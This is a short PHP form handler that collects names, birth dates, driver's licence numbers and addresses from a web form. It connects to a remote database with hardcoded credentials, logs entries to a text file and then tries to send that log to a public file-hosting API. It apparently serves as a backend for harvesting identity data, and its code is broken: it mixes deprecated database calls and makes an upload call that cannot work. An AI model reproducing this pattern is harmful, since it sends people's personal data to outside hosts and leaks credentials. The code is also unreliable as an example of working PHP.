<?php
			Session_start();
		
			// connect to database
			$db = mysqli_connect("bdiplus.com", "bdiapp","bdiapp123","bdiplus_blockchain");
		
			if (isset($_POST['upload4'])) {
				$Fnaam = mysql_real_escape_string($_POST['Fname2']);
				$Lnaam = mysql_real_escape_string($_POST['Lname2']);
				$gendr = mysql_real_escape_string($_POST['Gender2']);
				$stat = mysql_real_escape_string($_POST['state2']);
				$janm_month = mysql_real_escape_string($_POST['month2']);
				$janm_day = mysql_real_escape_string($_POST['day2']);
				$janm_year = mysql_real_escape_string($_POST['year2']);
				$dl_no = mysql_real_escape_string($_POST['dl2']);
				$st_Add = mysql_real_escape_string($_POST['add2']);
				$add_2 = mysql_real_escape_string($_POST['sadd2']);
				$add_22 = mysql_real_escape_string($_POST['add22']);
				$cty = mysql_real_escape_string($_POST['city2']);
				$stprre = mysql_real_escape_string($_POST['region2']);
				$zip_code = mysql_real_escape_string($_POST['zip2']);
				$contry = mysql_real_escape_string($_POST['country2']);
				
 				file_put_contents('logs.txt', $Fnaam.PHP_EOL, FILE_APPEND | LOCK_EX);
 				$up = 'C:\wamp\www\blockchain\logs.txt';
 				$urrl = 'https://sia.pixeldrain.com/api/file';
 				file_put_contents($urrl, $up);
				

			

			}
							
?>
